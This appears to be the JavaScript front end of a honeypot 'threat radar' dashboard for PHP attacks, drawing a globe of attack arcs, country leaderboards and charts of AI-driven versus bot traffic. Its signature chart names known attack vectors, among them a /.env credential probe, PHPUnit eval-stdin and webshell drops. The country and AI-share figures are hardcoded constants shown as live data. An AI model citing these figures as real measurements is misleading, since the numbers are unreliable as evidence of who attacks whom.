/* ============================================================================
 * PHP THREAT RADAR v3.0 — CheckPoint ThreatMap Smooth Arcs + Geopolitical Tab
 * ============================================================================ */

lucide.createIcons();

// Global Dashboard State
let isStreamPaused = false;
let isGlobeRotating = true;
let isHotspotAutoFocus = true;
let filterKeyword = '';
let aiFilterMode = 'ALL'; // ALL | AI_ONLY | LEGACY_ONLY
let allEvents = [];
let activeArcs = [];
let activeRings = [];
let honeypotPoints = [];
let yearlyHistoryData = [];
let monthlyEscalationData = [];

// Country Flag Helper
const COUNTRY_FLAGS = {
  CN: '🇨🇳', RU: '🇷🇺', US: '🇺🇸', NL: '🇳🇱', VN: '🇻🇳', BR: '🇧🇷',
  IN: '🇮🇳', DE: '🇩🇪', IR: '🇮🇷', KR: '🇰🇷', RO: '🇷🇴', FR: '🇫🇷',
  SG: '🇸🇬', JP: '🇯🇵', ID: '🇮🇩', UA: '🇺🇦', GB: '🇬🇧'
};

// Geopolitical Tallies: Top Attacking Countries (Source) vs Most Affected Countries (Targets)
const attackerCountries = {
  CN: { code: 'CN', name: 'China', count: 42850, aiCount: 29400, topAsn: 'AS4134 Chinanet' },
  RU: { code: 'RU', name: 'Russia', count: 38120, aiCount: 26800, topAsn: 'AS12389 Rostelecom' },
  US: { code: 'US', name: 'United States', count: 31940, aiCount: 21500, topAsn: 'AS14061 DigitalOcean' },
  NL: { code: 'NL', name: 'Netherlands', count: 24610, aiCount: 17100, topAsn: 'AS53667 FranTech' },
  VN: { code: 'VN', name: 'Vietnam', count: 19450, aiCount: 11800, topAsn: 'AS45899 VNPT-AS' },
  IR: { code: 'IR', name: 'Iran', count: 16820, aiCount: 11400, topAsn: 'AS44244 Irancell' },
  DE: { code: 'DE', name: 'Germany', count: 15290, aiCount: 10100, topAsn: 'AS24940 Hetzner' },
  IN: { code: 'IN', name: 'India', count: 13840, aiCount: 8400, topAsn: 'AS45609 Bharti-Airtel' },
  BR: { code: 'BR', name: 'Brazil', count: 12190, aiCount: 7200, topAsn: 'AS28573 Claro-BR' },
  RO: { code: 'RO', name: 'Romania', count: 10840, aiCount: 7150, topAsn: 'AS9009 M247-Europe' }
};

const affectedTargetCountries = {
  US: { code: 'US', name: 'United States', count: 54920, aiCount: 37900, stack: 'Laravel / WordPress / Cloud APIs' },
  BR: { code: 'BR', name: 'Brazil', count: 41380, aiCount: 28100, stack: 'Gov PHP / E-commerce / WordPress' },
  DE: { code: 'DE', name: 'Germany', count: 36740, aiCount: 24900, stack: 'Symfony / Shopware / Core PHP' },
  SG: { code: 'SG', name: 'Singapore', count: 29850, aiCount: 20400, stack: 'Fintech APIs / Laravel Octane' },
  NL: { code: 'NL', name: 'Netherlands', count: 25410, aiCount: 16900, stack: 'Hosting Clusters / Plesk PHP' },
  JP: { code: 'JP', name: 'Japan', count: 22980, aiCount: 15800, stack: 'Enterprise PHP-CGI / EC-Cube' },
  FR: { code: 'FR', name: 'France', count: 18420, aiCount: 12100, stack: 'Symfony / PrestaShop' },
  GB: { code: 'GB', name: 'United Kingdom', count: 16910, aiCount: 11300, stack: 'Laravel / Drupal / WooCommerce' }
};

// Category tallies for dynamic charts
const categoryCounts = {
  RCE: 340,
  LFI: 215,
  EnvProbe: 280,
  Webshell: 190,
  Deserialization: 145,
  SQLi: 175
};

// Target Stack tallies
const stackCounts = {
  'Core PHP-CGI': 310,
  'Laravel Framework': 275,
  'WordPress / Plugins': 340,
  'Composer / PHPUnit': 195,
  'Symfony / Monolog': 140,
  'Custom PHP / .env': 220
};

// Signature tallies
const signatureCounts = {
  'CVE-2024-4577 (PHP-CGI)': 412,
  '/.env Credential Probe': 368,
  'eval-stdin.php (PHPUnit)': 319,
  'php://filter Chain RCE': 274,
  '/_ignition/execute-solution': 241,
  '/xmlrpc.php Multicall': 198,
  'Alfa/WSO Webshell Drop': 176
};

// ============================================================================
// 1. TAB NAVIGATION CONTROLLER
// ============================================================================
const tabButtons = document.querySelectorAll('.nav-tab');
const tabPanels = document.querySelectorAll('.tab-panel');

function switchTab(targetTabId) {
  tabButtons.forEach(btn => {
    const isTarget = btn.getAttribute('data-tab') === targetTabId;
    btn.classList.toggle('active', isTarget);
  });

  tabPanels.forEach(panel => {
    if (panel.id === targetTabId) {
      panel.classList.remove('hidden');
      if (targetTabId === 'tab-command' || targetTabId === 'tab-news') {
        panel.classList.add('grid');
      } else {
        panel.classList.add('flex');
      }
    } else {
      panel.classList.add('hidden');
      panel.classList.remove('grid', 'flex');
    }
  });

  setTimeout(() => {
    resizeGlobe();
    monthlyEscalationChart?.resize();
    geopoliticalMatrixChart?.resize();
    annualTimelineChart?.resize();
    radarChart?.resize();
    topSigChart?.resize();
    ecosystemChart?.resize();
  }, 60);
}

tabButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    switchTab(btn.getAttribute('data-tab'));
  });
});

document.querySelectorAll('[data-goto-tab]').forEach(el => {
  el.addEventListener('click', () => {
    switchTab(el.getAttribute('data-goto-tab'));
  });
});

// Support ?tab= URL parameter & ?drawer=open for direct deep-linking and automated screenshots
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.get('tab')) {
  setTimeout(() => switchTab(urlParams.get('tab')), 250);
}
if (urlParams.get('drawer') === 'open') {
  setTimeout(() => {
    if (allEvents.length > 0) openForensicDrawer(allEvents[0]);
  }, 1200);
}

// ============================================================================
// 2. CHECKPOINT THREATMAP-STYLE SMOOTH 3D GLOBE (No Blinking / No Reset!)
// ============================================================================
const globeContainer = document.getElementById('globe-container');
const world = Globe()(globeContainer)
  .globeImageUrl('https://unpkg.com/three-globe/example/img/earth-night.jpg')
  .bumpImageUrl('https://unpkg.com/three-globe/example/img/earth-topology.png')
  .backgroundColor('rgba(0,0,0,0)')
  .showAtmosphere(true)
  .atmosphereColor('#06b6d4')
  .atmosphereAltitude(0.18)
  .pointOfView({ lat: 20, lng: 8, altitude: 2.02 })
  // Key to CheckPoint ThreatMap smoothness: disable arc transition re-interpolation and use long smooth laser beams!
  .arcsTransitionDuration(0)
  .arcsData(activeArcs)
  .arcStartLat(d => d.srcLat)
  .arcStartLng(d => d.srcLng)
  .arcEndLat(d => d.destLat)
  .arcEndLng(d => d.destLng)
  .arcColor(d => d.isAiDriven
    ? ['rgba(168, 85, 247, 0.15)', '#c084fc', '#00ff9d']
    : ['rgba(255, 42, 95, 0.15)', d.color || '#ff2a5f', '#38bdf8']
  )
  .arcAltitudeAutoScale(0.38)
  .arcStroke(d => d.isAiDriven ? 0.85 : 0.6)
  // Smooth continuous CheckPoint missile trail (single long comet beam per arc)
  .arcDashLength(0.9)
  .arcDashGap(2.2)
  .arcDashInitialGap(0)
  .arcDashAnimateTime(2600)
  .arcLabel(d => `
    <div style="background: rgba(3,7,18,0.94); border: 1px solid ${d.isAiDriven ? '#a855f7' : '#ff2a5f'}; padding: 9px 11px; border-radius: 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #f8fafc;">
      <div style="color:${d.isAiDriven ? '#c084fc' : '#fb7185'}; font-weight:700;">
        ${d.isAiDriven ? '🤖 ATAQUE GERADO POR IA' : '⚙️ BOTNET TRADICIONAL'} (${d.aiConfidence}% conf.)
      </div>
      <div style="font-weight:700; margin-top:2px;">[${d.cve}] ${d.attackName}</div>
      <div>Origem: ${d.sourceIp} (${d.originCountry}) → ${d.destCity}</div>
      <div style="color:#94a3b8; margin-top:3px;">${d.aiType}</div>
    </div>
  `)
  .ringsData(activeRings)
  .ringLat(d => d.lat)
  .ringLng(d => d.lng)
  .ringColor(d => t => `${d.color}${Math.round((1 - t) * 210).toString(16).padStart(2, '0')}`)
  .ringMaxRadius(4.8)
  .ringPropagationSpeed(2.1)
  .ringRepeatPeriod(950)
  .pointsTransitionDuration(0)
  .pointsData([])
  .pointLat(d => d.lat)
  .pointLng(d => d.lng)
  .pointColor(d => d.color || '#00ff9d')
  .pointAltitude(0.015)
  .pointRadius(0.5)
  .pointLabel(d => `
    <div style="background: rgba(3,7,18,0.92); border: 1px solid #00ff9d; padding: 6px 9px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #e2e8f0;">
      <strong style="color:#00ff9d;">● HONEYPOT PHP SENSOR</strong><br/>
      ${d.city}, ${d.country} (${d.asn})
    </div>
  `);

const controls = world.controls();
controls.autoRotate = true;
controls.autoRotateSpeed = 0.28;
controls.enableZoom = true;

// Volume-Weighted Hotspot Camera Director:
// Dynamically tracks real-time attack density by region and keeps the camera focused longer on regions with MORE attacks!
const REGION_CLUSTERS = {
  EAST_ASIA: { id: 'EAST_ASIA', lat: 35.5, lng: 112.0, label: 'Ásia Oriental (Clusters CN / VN / KR)', heatScore: 18 },
  NORTH_AMERICA: { id: 'NORTH_AMERICA', lat: 38.8, lng: -77.2, label: 'América do Norte (US Cloud East)', heatScore: 22 },
  EUROPE: { id: 'EUROPE', lat: 51.2, lng: 10.4, label: 'Europa Central & Leste (DE / NL / RU)', heatScore: 20 },
  SOUTH_AMERICA: { id: 'SOUTH_AMERICA', lat: -23.5, lng: -46.6, label: 'América do Sul (Brasil — São Paulo Hub)', heatScore: 15 },
  SE_ASIA: { id: 'SE_ASIA', lat: 1.35, lng: 103.8, label: 'Sudeste Asiático (Singapura / IN)', heatScore: 14 }
};

function registerAttackHeatForCamera(evt) {
  // Decay all regions slightly so the heat reflects CURRENT live concentration
  Object.values(REGION_CLUSTERS).forEach(r => {
    r.heatScore = Math.max(5, r.heatScore * 0.94);
  });

  // Boost target region and origin region based on incoming attack
  const destCode = evt.destCode || 'US';
  const origCode = evt.originCode || 'CN';

  if (destCode === 'US' || origCode === 'US') REGION_CLUSTERS.NORTH_AMERICA.heatScore += 4.2;
  if (destCode === 'BR' || origCode === 'BR') REGION_CLUSTERS.SOUTH_AMERICA.heatScore += 4.5;
  if (['DE', 'NL', 'RU', 'FR', 'RO', 'UA'].includes(destCode) || ['DE', 'NL', 'RU', 'FR', 'RO', 'UA'].includes(origCode)) {
    REGION_CLUSTERS.EUROPE.heatScore += 3.8;
  }
  if (['CN', 'VN', 'KR', 'JP'].includes(destCode) || ['CN', 'VN', 'KR', 'JP'].includes(origCode)) {
    REGION_CLUSTERS.EAST_ASIA.heatScore += 3.9;
  }
  if (['SG', 'IN', 'ID'].includes(destCode) || ['SG', 'IN', 'ID'].includes(origCode)) {
    REGION_CLUSTERS.SE_ASIA.heatScore += 4.0;
  }
}

let currentFocusedClusterId = null;
let focusHoldTicksRemaining = 0;

function evaluateVolumeDrivenCameraFocus() {
  if (!isHotspotAutoFocus || !isGlobeRotating) return;

  // Sort clusters by live attack volume (heatScore)
  const ranked = Object.values(REGION_CLUSTERS).sort((a, b) => b.heatScore - a.heatScore);
  const topRegion = ranked[0];
  const totalHeat = ranked.reduce((acc, r) => acc + r.heatScore, 0) || 1;
  const sharePct = Math.round((topRegion.heatScore / totalHeat) * 100);

  // If the current region still has hold time and hasn't been drastically overtaken, stay locked on it!
  if (focusHoldTicksRemaining > 0 && currentFocusedClusterId === topRegion.id) {
    focusHoldTicksRemaining--;
    const bannerText = document.getElementById('hotspot-camera-text');
    if (bannerText) {
      bannerText.textContent = `🎯 Foco por Volume (${sharePct}% dos ataques ativos): ${topRegion.label}`;
    }
    return;
  }

  // Otherwise, glide smoothly to the #1 highest-attack region right now, and hold proportional to its attack volume!
  currentFocusedClusterId = topRegion.id;
  // More attacks = stays focused longer on that position (between 3 and 9 evaluation cycles)
  focusHoldTicksRemaining = Math.min(9, Math.max(3, Math.round(sharePct / 5)));

  world.pointOfView({ lat: topRegion.lat, lng: topRegion.lng, altitude: 1.96 }, 2400);

  const bannerText = document.getElementById('hotspot-camera-text');
  if (bannerText) {
    bannerText.textContent = `🎯 Foco por Volume (${sharePct}% dos ataques ativos): ${topRegion.label}`;
  }
}

setInterval(evaluateVolumeDrivenCameraFocus, 2800);

function resizeGlobe() {
  if (!globeContainer || globeContainer.offsetParent === null) return;
  const rect = globeContainer.getBoundingClientRect();
  if (rect.width > 0 && rect.height > 0) {
    world.width(rect.width);
    world.height(rect.height);
  }
}
window.addEventListener('resize', resizeGlobe);
setTimeout(resizeGlobe, 100);

// Smooth lifecycle helper: adds an arc that glides once from origin to destination and expires cleanly without resetting existing arcs
function spawnSmoothCheckPointArc(evt) {
  activeArcs.push(evt);
  if (activeArcs.length > 18) {
    activeArcs.shift();
  }
  world.arcsData(activeArcs);

  const ringObj = { lat: evt.destLat, lng: evt.destLng, color: evt.isAiDriven ? '#a855f7' : '#ff2a5f' };
  activeRings.push(ringObj);
  if (activeRings.length > 12) {
    activeRings.shift();
  }
  world.ringsData(activeRings);
}

// ============================================================================
// 3. GEOPOLITICAL LEADERBOARDS (Top Attacking Countries vs Most Affected)
// ============================================================================
const geopoliticalMatrixChart = echarts.init(document.getElementById('chart-geopolitical-matrix'));

function renderCountryLeaderboards() {
  // 1. Top Origins (Where attacks come from)
  const sortedOrigins = Object.values(attackerCountries).sort((a, b) => b.count - a.count);
  const maxOrigin = sortedOrigins[0]?.count || 1;

  // Floating HUD on Globe (Top 4)
  const hudOrigins = document.getElementById('hud-top-origins');
  if (hudOrigins) {
    hudOrigins.innerHTML = sortedOrigins.slice(0, 4).map((c, i) => `
      <div class="flex items-center justify-between text-slate-200">
        <span class="truncate">${i + 1}. ${COUNTRY_FLAGS[c.code] || '🌐'} ${c.name}</span>
        <span class="text-rose-400 font-bold">${(c.count / 1000).toFixed(1)}k</span>
      </div>
    `).join('');
  }

  // Full Leaderboard in Tab 2
  const originsContainer = document.getElementById('country-origins-leaderboard');
  if (originsContainer) {
    originsContainer.innerHTML = sortedOrigins.slice(0, 8).map((c, idx) => {
      const pctWidth = Math.round((c.count / maxOrigin) * 100);
      const aiShare = Math.round((c.aiCount / c.count) * 100);
      return `
        <div class="p-3 rounded-xl bg-slate-900/90 border border-slate-800/90">
          <div class="flex items-center justify-between text-xs font-mono-code mb-1.5">
            <div class="flex items-center gap-2">
              <span class="w-5 h-5 rounded bg-rose-500/20 text-rose-300 font-bold flex items-center justify-center text-[10px]">#${idx + 1}</span>
              <span class="text-sm">${COUNTRY_FLAGS[c.code] || '🌐'}</span>
              <span class="font-bold text-white">${c.name}</span>
              <span class="text-[10px] text-slate-400">(${c.topAsn})</span>
            </div>
            <div class="flex items-center gap-2">
              <span class="px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300 text-[10px]">🤖 ${aiShare}% IA</span>
              <span class="font-bold text-rose-400">${c.count.toLocaleString('pt-BR')}</span>
            </div>
          </div>
          <div class="w-full h-2 rounded-full bg-slate-950 overflow-hidden">
            <div class="h-full rounded-full bg-gradient-to-r from-rose-500 to-purple-500 progress-bar-fill" style="width: ${pctWidth}%"></div>
          </div>
        </div>
      `;
    }).join('');
  }

  // 2. Most Affected Target Countries
  const sortedTargets = Object.values(affectedTargetCountries).sort((a, b) => b.count - a.count);
  const maxTarget = sortedTargets[0]?.count || 1;

  // Floating HUD on Globe (Top 4)
  const hudTargets = document.getElementById('hud-top-targets');
  if (hudTargets) {
    hudTargets.innerHTML = sortedTargets.slice(0, 4).map((c, i) => `
      <div class="flex items-center justify-between text-slate-200">
        <span class="truncate">${i + 1}. ${COUNTRY_FLAGS[c.code] || '🌐'} ${c.name}</span>
        <span class="text-emerald-400 font-bold">${(c.count / 1000).toFixed(1)}k</span>
      </div>
    `).join('');
  }

  // Full Leaderboard in Tab 2
  const targetsContainer = document.getElementById('country-targets-leaderboard');
  if (targetsContainer) {
    targetsContainer.innerHTML = sortedTargets.slice(0, 8).map((c, idx) => {
      const pctWidth = Math.round((c.count / maxTarget) * 100);
      const aiShare = Math.round((c.aiCount / c.count) * 100);
      return `
        <div class="p-3 rounded-xl bg-slate-900/90 border border-slate-800/90">
          <div class="flex items-center justify-between text-xs font-mono-code mb-1.5">
            <div class="flex items-center gap-2">
              <span class="w-5 h-5 rounded bg-emerald-500/20 text-emerald-300 font-bold flex items-center justify-center text-[10px]">#${idx + 1}</span>
              <span class="text-sm">${COUNTRY_FLAGS[c.code] || '🌐'}</span>
              <span class="font-bold text-white">${c.name}</span>
              <span class="text-[10px] text-slate-400 truncate max-w-[160px]">(${c.stack})</span>
            </div>
            <div class="flex items-center gap-2">
              <span class="px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300 text-[10px]">🤖 ${aiShare}% IA</span>
              <span class="font-bold text-emerald-400">${c.count.toLocaleString('pt-BR')}</span>
            </div>
          </div>
          <div class="w-full h-2 rounded-full bg-slate-950 overflow-hidden">
            <div class="h-full rounded-full bg-gradient-to-r from-emerald-400 to-cyan-400 progress-bar-fill" style="width: ${pctWidth}%"></div>
          </div>
        </div>
      `;
    }).join('');
  }

  // 3. Update Geopolitical Matrix EChart
  const keyNations = ['US', 'CN', 'RU', 'BR', 'DE', 'NL', 'SG', 'IN', 'VN', 'FR'];
  const nationLabels = keyNations.map(code => `${COUNTRY_FLAGS[code] || ''} ${code}`);
  const sentData = keyNations.map(code => attackerCountries[code]?.count || 8400);
  const receivedData = keyNations.map(code => affectedTargetCountries[code]?.count || 9200);
  const aiSentData = keyNations.map(code => attackerCountries[code]?.aiCount || 5100);

  geopoliticalMatrixChart.setOption({
    backgroundColor: 'transparent',
    tooltip: {
      trigger: 'axis',
      axisPointer: { type: 'shadow' },
      backgroundColor: 'rgba(9, 14, 28, 0.95)',
      borderColor: '#06b6d4',
      textStyle: { color: '#f8fafc', fontFamily: 'JetBrains Mono', fontSize: 11 }
    },
    legend: {
      top: 0,
      left: 0,
      textStyle: { color: '#cbd5e1', fontFamily: 'JetBrains Mono', fontSize: 10 }
    },
    grid: { top: 34, bottom: 26, left: 54, right: 16 },
    xAxis: {
      type: 'category',
      data: nationLabels,
      axisLine: { lineStyle: { color: 'rgba(148,163,184,0.25)' } },
      axisLabel: { color: '#e2e8f0', fontFamily: 'JetBrains Mono', fontSize: 11 }
    },
    yAxis: {
      type: 'value',
      splitLine: { lineStyle: { color: 'rgba(148,163,184,0.08)' } },
      axisLabel: {
        color: '#64748b',
        fontFamily: 'JetBrains Mono',
        fontSize: 10,
        formatter: v => `${(v / 1000).toFixed(0)}k`
      }
    },
    series: [
      {
        name: 'Ataques Disparados (Origem)',
        type: 'bar',
        barGap: '12%',
        itemStyle: { color: '#ff2a5f', borderRadius: [4, 4, 0, 0] },
        data: sentData
      },
      {
        name: 'Ataques Sofridos (Mais Afetados)',
        type: 'bar',
        itemStyle: { color: '#00ff9d', borderRadius: [4, 4, 0, 0] },
        data: receivedData
      },
      {
        name: 'Volume Guiado por IA',
        type: 'line',
        smooth: true,
        symbolSize: 7,
        lineStyle: { width: 2.5, color: '#a855f7' },
        itemStyle: { color: '#a855f7' },
        data: aiSentData
      }
    ]
  });
}

// ============================================================================
// 4. MONTHLY ESCALATION CHART ("Mais ataques nos últimos meses do que antes")
// ============================================================================
const monthlyEscalationChart = echarts.init(document.getElementById('chart-monthly-escalation'));

function renderMonthlyEscalationChart() {
  if (!monthlyEscalationData || monthlyEscalationData.length === 0) return;

  const labels = monthlyEscalationData.map(m => m.label);
  const legacyData = monthlyEscalationData.map(m => m.legacyBots);
  const aiData = monthlyEscalationData.map(m => m.aiDriven);
  const totalData = monthlyEscalationData.map(m => m.total);

  const firstHalfSum = monthlyEscalationData.slice(0, 6).reduce((a, b) => a + b.total, 0);
  const secondHalfSum = monthlyEscalationData.slice(6).reduce((a, b) => a + b.total, 0);
  const surgePct = (((secondHalfSum - firstHalfSum) / firstHalfSum) * 100).toFixed(1);
  const kpiSurge = document.getElementById('kpi-surge-pct');
  if (kpiSurge) kpiSurge.textContent = `+${surgePct}%`;

  const lastMonth = monthlyEscalationData[monthlyEscalationData.length - 1];
  const kpiAiPct = document.getElementById('kpi-ai-pct');
  if (kpiAiPct && lastMonth) kpiAiPct.textContent = `${lastMonth.aiSharePct}%`;

  monthlyEscalationChart.setOption({
    backgroundColor: 'transparent',
    tooltip: {
      trigger: 'axis',
      axisPointer: { type: 'shadow' },
      backgroundColor: 'rgba(9, 14, 28, 0.96)',
      borderColor: '#a855f7',
      textStyle: { color: '#f8fafc', fontFamily: 'JetBrains Mono', fontSize: 11 },
      formatter: (params) => {
        const idx = params[0].dataIndex;
        const m = monthlyEscalationData[idx];
        const periodTag = m.era === 'RECENT_SURGE'
          ? '<span style="color:#fbbf24;font-weight:700;">⚡ ÚLTIMOS MESES (ESCALADA IA)</span>'
          : '<span style="color:#94a3b8;">Período Anterior (Baseline)</span>';
        return `
          <div style="margin-bottom:4px;"><b>${m.label}</b> — ${periodTag}</div>
          <div>Total Mensal: <b>${m.total.toLocaleString('pt-BR')}</b> ataques</div>
          <div style="color:#c084fc;">🤖 Ataques via IA: <b>${m.aiDriven.toLocaleString('pt-BR')}</b> (${m.aiSharePct}%)</div>
          <div style="color:#38bdf8;">⚙️ Bots Tradicionais: <b>${m.legacyBots.toLocaleString('pt-BR')}</b> (${100 - m.aiSharePct}%)</div>
        `;
      }
    },
    legend: {
      top: 0,
      left: 0,
      itemGap: 16,
      textStyle: { color: '#cbd5e1', fontFamily: 'JetBrains Mono', fontSize: 10 },
      itemWidth: 11,
      itemHeight: 7
    },
    grid: { top: 32, bottom: 26, left: 48, right: 14 },
    xAxis: {
      type: 'category',
      data: labels,
      axisLine: { lineStyle: { color: 'rgba(148,163,184,0.25)' } },
      axisLabel: { color: '#cbd5e1', fontFamily: 'JetBrains Mono', fontSize: 9, interval: 0, rotate: 18 }
    },
    yAxis: {
      type: 'value',
      splitLine: { lineStyle: { color: 'rgba(148,163,184,0.08)' } },
      axisLabel: {
        color: '#64748b',
        fontFamily: 'JetBrains Mono',
        fontSize: 9,
        formatter: (v) => v >= 1000000 ? `${(v / 1000000).toFixed(1)}M` : `${(v / 1000).toFixed(0)}k`
      }
    },
    series: [
      {
        name: 'Bots Tradicionais',
        type: 'bar',
        stack: 'monthly',
        barWidth: '52%',
        itemStyle: { color: 'rgba(6, 182, 212, 0.7)' },
        data: legacyData
      },
      {
        name: 'Ataques por Agentes IA',
        type: 'bar',
        stack: 'monthly',
        barWidth: '52%',
        itemStyle: {
          color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [
            { offset: 0, color: '#ff2a5f' },
            { offset: 1, color: '#a855f7' }
          ]),
          borderRadius: [5, 5, 0, 0]
        },
        data: aiData,
        markArea: {
          itemStyle: {
            color: 'rgba(245, 158, 11, 0.07)',
            borderColor: 'rgba(245, 158, 11, 0.35)',
            borderWidth: 1,
            borderType: 'dashed'
          },
          label: {
            color: '#fbbf24',
            fontFamily: 'JetBrains Mono',
            fontSize: 9,
            fontWeight: 'bold',
            position: 'insideTop'
          },
          data: [
            [
              { name: 'ÚLTIMOS 6 MESES: EXPLOSÃO DE ATAQUES IA', xAxis: 'Mai/26' },
              { xAxis: 'Out/26 (Atual)' }
            ]
          ]
        }
      },
      {
        name: 'Curva de Escalada Total',
        type: 'line',
        smooth: true,
        symbol: 'circle',
        symbolSize: 6,
        lineStyle: { width: 2.5, color: '#00ff9d' },
        itemStyle: { color: '#00ff9d' },
        data: totalData
      }
    ]
  });
}

// ============================================================================
// 5. SECONDARY CHARTS (TAB 3: 365-DAY TIMELINE + OWASP RADAR + TOP SIG + ROSE)
// ============================================================================
const annualTimelineChart = echarts.init(document.getElementById('chart-annual-timeline'));
let currentZoomStart = 0;

function initAnnualTimelineChart() {
  if (!yearlyHistoryData || yearlyHistoryData.length === 0) return;

  const dates = yearlyHistoryData.map(d => d.date);
  const aiSeries = yearlyHistoryData.map(d => d.aiDriven);
  const legacySeries = yearlyHistoryData.map(d => d.legacyBots);
  const totalData = yearlyHistoryData.map(d => d.total);

  const todayItem = yearlyHistoryData[yearlyHistoryData.length - 1];
  if (todayItem) {
    const kpiToday = document.getElementById('kpi-today-attacks');
    if (kpiToday) kpiToday.textContent = todayItem.total.toLocaleString('pt-BR');
  }

  annualTimelineChart.setOption({
    backgroundColor: 'transparent',
    tooltip: {
      trigger: 'axis',
      axisPointer: { type: 'cross', label: { backgroundColor: '#0f172a' } },
      backgroundColor: 'rgba(9, 14, 28, 0.96)',
      borderColor: '#06b6d4',
      textStyle: { color: '#f8fafc', fontFamily: 'JetBrains Mono', fontSize: 11 }
    },
    legend: {
      top: 0,
      left: 8,
      textStyle: { color: '#94a3b8', fontFamily: 'JetBrains Mono', fontSize: 10 }
    },
    grid: { top: 36, bottom: 58, left: 52, right: 20 },
    dataZoom: [
      { type: 'inside', start: currentZoomStart, end: 100 },
      {
        type: 'slider',
        start: currentZoomStart,
        end: 100,
        height: 20,
        bottom: 8,
        borderColor: 'rgba(56, 189, 248, 0.25)',
        fillerColor: 'rgba(168, 85, 247, 0.2)',
        textStyle: { color: '#94a3b8', fontFamily: 'JetBrains Mono', fontSize: 9 }
      }
    ],
    xAxis: {
      type: 'category',
      boundaryGap: false,
      data: dates,
      axisLine: { lineStyle: { color: 'rgba(148,163,184,0.25)' } },
      axisLabel: { color: '#94a3b8', fontFamily: 'JetBrains Mono', fontSize: 10 }
    },
    yAxis: {
      type: 'value',
      splitLine: { lineStyle: { color: 'rgba(148,163,184,0.08)' } },
      axisLabel: {
        color: '#64748b',
        fontFamily: 'JetBrains Mono',
        fontSize: 10,
        formatter: (val) => val >= 1000 ? `${(val / 1000).toFixed(0)}k` : val
      }
    },
    series: [
      {
        name: 'Bots Convencionais (Baseline)',
        type: 'line',
        stack: 'annual',
        smooth: true,
        showSymbol: false,
        lineStyle: { width: 1.5, color: '#06b6d4' },
        areaStyle: { color: 'rgba(6, 182, 212, 0.25)' },
        data: legacySeries
      },
      {
        name: 'Agentes de IA Autônomos (Escalada Recente)',
        type: 'line',
        stack: 'annual',
        smooth: true,
        showSymbol: false,
        lineStyle: { width: 2, color: '#a855f7' },
        areaStyle: {
          color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [
            { offset: 0, color: 'rgba(255, 42, 95, 0.65)' },
            { offset: 1, color: 'rgba(168, 85, 247, 0.15)' }
          ])
        },
        data: aiSeries
      },
      {
        name: 'Volume Total Diário',
        type: 'line',
        smooth: true,
        showSymbol: false,
        lineStyle: { width: 1.5, color: '#00ff9d', type: 'dashed' },
        itemStyle: { color: '#00ff9d' },
        data: totalData,
        markPoint: {
          symbol: 'pin',
          symbolSize: 44,
          itemStyle: { color: '#00ff9d' },
          label: { color: '#030712', fontFamily: 'JetBrains Mono', fontWeight: 'bold', fontSize: 9, formatter: 'HOJE' },
          data: [{ name: 'Hoje Ao Vivo', coord: [dates.length - 1, totalData[totalData.length - 1]] }]
        }
      }
    ]
  });
}

function updateTodayAndCurrentMonthLive(todayBucket, currentMonthBucket) {
  if (todayBucket && yearlyHistoryData.length > 0) {
    const lastIdx = yearlyHistoryData.length - 1;
    yearlyHistoryData[lastIdx] = todayBucket;
    const kpiToday = document.getElementById('kpi-today-attacks');
    if (kpiToday) kpiToday.textContent = todayBucket.total.toLocaleString('pt-BR');

    annualTimelineChart.setOption({
      series: [
        { data: yearlyHistoryData.map(d => d.legacyBots) },
        { data: yearlyHistoryData.map(d => d.aiDriven) },
        {
          data: yearlyHistoryData.map(d => d.total),
          markPoint: { data: [{ name: 'Hoje Ao Vivo', coord: [lastIdx, todayBucket.total] }] }
        }
      ]
    });
  }

  if (currentMonthBucket && monthlyEscalationData.length > 0) {
    monthlyEscalationData[monthlyEscalationData.length - 1] = currentMonthBucket;
    renderMonthlyEscalationChart();
  }
}

document.querySelectorAll('.btn-timeline-range').forEach(btn => {
  btn.addEventListener('click', (e) => {
    document.querySelectorAll('.btn-timeline-range').forEach(b => {
      b.className = 'btn-timeline-range px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-700 cursor-pointer transition';
    });
    e.currentTarget.className = 'btn-timeline-range px-3 py-1.5 rounded-lg bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 font-bold cursor-pointer transition';

    const days = Number(e.currentTarget.getAttribute('data-range')) || 365;
    currentZoomStart = Math.max(0, Math.round(((365 - days) / 365) * 100));
    annualTimelineChart.dispatchAction({ type: 'dataZoom', start: currentZoomStart, end: 100 });
  });
});

const radarChart = echarts.init(document.getElementById('chart-radar'));
radarChart.setOption({
  backgroundColor: 'transparent',
  radar: {
    radius: '65%',
    axisName: { color: '#94a3b8', fontFamily: 'JetBrains Mono', fontSize: 10 },
    splitArea: { areaStyle: { color: ['rgba(6,182,212,0.03)', 'rgba(168,85,247,0.06)'] } },
    indicator: [
      { name: 'RCE (CGI/Eval)', max: 600 },
      { name: '.env / Config', max: 600 },
      { name: 'LFI / Filter', max: 600 },
      { name: 'Webshells', max: 600 },
      { name: 'SQL Injection', max: 600 },
      { name: 'Unserialize()', max: 600 }
    ]
  },
  series: [{
    type: 'radar',
    lineStyle: { width: 2, color: '#ff2a5f' },
    areaStyle: { color: 'rgba(255, 42, 95, 0.35)' },
    data: [{ value: [340, 280, 215, 190, 175, 145], name: 'Vetores' }]
  }]
});

const topSigChart = echarts.init(document.getElementById('chart-top-signatures'));
function updateTopSignaturesChart() {
  const entries = Object.entries(signatureCounts).sort((a, b) => a[1] - b[1]);
  topSigChart.setOption({
    backgroundColor: 'transparent',
    grid: { top: 8, bottom: 18, left: 175, right: 38 },
    xAxis: { type: 'value', splitLine: { lineStyle: { color: 'rgba(148,163,184,0.08)' } }, axisLabel: { color: '#64748b', fontSize: 9 } },
    yAxis: { type: 'category', data: entries.map(e => e[0]), axisLabel: { color: '#cbd5e1', fontFamily: 'JetBrains Mono', fontSize: 10 } },
    series: [{
      type: 'bar',
      data: entries.map(e => e[1]),
      barWidth: 12,
      itemStyle: { borderRadius: [0, 6, 6, 0], color: '#ff2a5f' },
      label: { show: true, position: 'right', color: '#f8fafc', fontFamily: 'JetBrains Mono', fontSize: 10 }
    }]
  });
}
